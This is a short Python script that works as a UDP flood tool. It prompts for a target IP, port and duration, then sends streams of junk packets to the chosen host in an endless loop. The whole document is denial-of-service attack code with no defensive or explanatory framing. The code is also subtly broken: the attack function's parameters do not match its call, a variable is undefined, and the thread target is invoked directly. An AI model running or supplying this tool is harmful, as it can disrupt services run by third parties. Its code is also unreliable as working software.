import sys
import socket
import threading
import time

def send_packet(host, port, seconds, amplifier):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((str(host), int(port)))

    t_end = time.time() + seconds
    while time.time() < t_end:
        s.send(b"\x99" * amplifier)

def attack(host, port):
    threading.Thread(target=send_packet(host, port, seconds, 800), daemon=True).start()

if __name__ == "__main__":
    while True:
        host = input("IP: ")
        port = int(input("Port: "))
        seconds = int(input("Time: "))
        attack(host, port, seconds)